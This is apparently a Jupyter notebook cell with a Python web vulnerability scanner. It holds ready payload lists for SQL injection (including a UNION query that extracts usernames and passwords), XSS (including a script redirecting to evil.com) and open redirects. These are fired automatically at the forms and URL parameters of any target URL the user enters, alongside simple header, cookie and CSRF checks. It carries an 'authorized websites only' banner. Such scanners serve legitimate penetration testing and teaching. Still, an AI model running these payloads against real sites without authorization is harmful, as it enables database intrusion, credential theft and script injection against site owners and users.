In [ ]:
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# -----------------------------------
# SQL Injection Payloads (ALL TYPES)
# -----------------------------------
sql_payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "' OR 1=1#",
    "' UNION SELECT null,null--",
    "' UNION SELECT username,password FROM users--",
    "' AND 1=1--",
    "' AND 1=2--",
    "' OR SLEEP(5)--",
    "'; WAITFOR DELAY '0:0:5'--",
    "'/**/OR/**/1=1--"
]

# -----------------------------------
# XSS Payloads (ALL TYPES)
# -----------------------------------
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "\" onmouseover=alert(1) \"",
    "<iframe src=javascript:alert(1)>",
    "<script>document.location='http://evil.com'</script>"
]

# -----------------------------------
# Open Redirect Payloads
# -----------------------------------
redirect_payloads = [
    "https://evil.com",
    "//evil.com",
    "http://evil.com",
    "///evil.com"
]

# -----------------------------------
# Get all forms
# -----------------------------------
def get_forms(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.text, "html.parser")
    return soup.find_all("form")

# -----------------------------------
# Extract form details
# -----------------------------------
def get_form_details(form):
    details = {}
    action = form.attrs.get("action")
    method = form.attrs.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        name = input_tag.attrs.get("name")
        input_type = input_tag.attrs.get("type", "text")

        inputs.append({
            "type": input_type,
            "name": name
        })

    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs

    return details

# -----------------------------------
# Submit form
# -----------------------------------
def submit_form(form_details, url, payload):
    target_url = urljoin(url, form_details["action"])
    data = {}

    for input in form_details["inputs"]:
        if input["name"]:
            data[input["name"]] = payload

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

# -----------------------------------
# SQL Injection Scanner
# -----------------------------------
def scan_sql_injection(url):
    print("\n[+] Testing SQL Injection...")

    for payload in sql_payloads:
        test_url = url + "?id=" + payload
        response = requests.get(test_url)

        if "error" in response.text.lower() or "sql" in response.text.lower():
            print(f"[!] SQL Injection found: {test_url}")
            return

    print("[-] No SQL Injection detected")

# -----------------------------------
# XSS Scanner
# -----------------------------------
def scan_xss(url):
    print("\n[+] Testing XSS...")

    forms = get_forms(url)

    for form in forms:
        details = get_form_details(form)

        for payload in xss_payloads:
            response = submit_form(details, url, payload)

            if payload in response.text:
                print("[!] XSS vulnerability detected")
                return

    print("[-] No XSS detected")

# -----------------------------------
# Open Redirect Scanner
# -----------------------------------
def check_open_redirect(url):
    print("\n[+] Checking Open Redirect...")

    for payload in redirect_payloads:
        test_url = url + "?redirect=" + payload
        response = requests.get(test_url, allow_redirects=False)

        if "Location" in response.headers:
            if payload in response.headers["Location"]:
                print(f"[!] Open Redirect found with payload: {payload}")
                return

    print("[-] No Open Redirect detected")

# -----------------------------------
# Security Headers Check
# -----------------------------------
def check_security_headers(url):
    print("\n[+] Checking Security Headers...")

    response = requests.get(url)
    headers = response.headers

    important_headers = [
        "X-Frame-Options",
        "Content-Security-Policy",
        "X-XSS-Protection",
        "Strict-Transport-Security",
        "Referrer-Policy"
    ]

    missing = [h for h in important_headers if h not in headers]

    if missing:
        print("[!] Missing headers:", missing)
    else:
        print("[+] All security headers present")

# -----------------------------------
# Cookie Check
# -----------------------------------
def check_cookies(url):
    print("\n[+] Checking Cookies...")

    response = requests.get(url)

    for cookie in response.cookies:
        print(f"[!] Cookie found: {cookie.name}")

# -----------------------------------
# CSRF Check
# -----------------------------------
def check_csrf(url):
    print("\n[+] Checking CSRF protection...")

    forms = get_forms(url)

    for form in forms:
        details = get_form_details(form)

        token_found = False

        for input in details["inputs"]:
            if input["name"] and any(x in input["name"].lower() for x in ["csrf", "token", "auth"]):
                token_found = True

        if not token_found:
            print("[!] Possible CSRF vulnerability (no token found)")
            return

    print("[-] CSRF protection seems present")

# -----------------------------------
# MAIN
# -----------------------------------
def main():
    print(" Use this tool only on authorized websites!\n")

    url = input("Enter target URL: ")

    scan_sql_injection(url)
    scan_xss(url)
    check_open_redirect(url)
    check_security_headers(url)
    check_cookies(url)
    check_csrf(url)

# -----------------------------------
# RUN
# -----------------------------------
if __name__ == "__main__":
    main()

 Use this tool only on authorized websites!

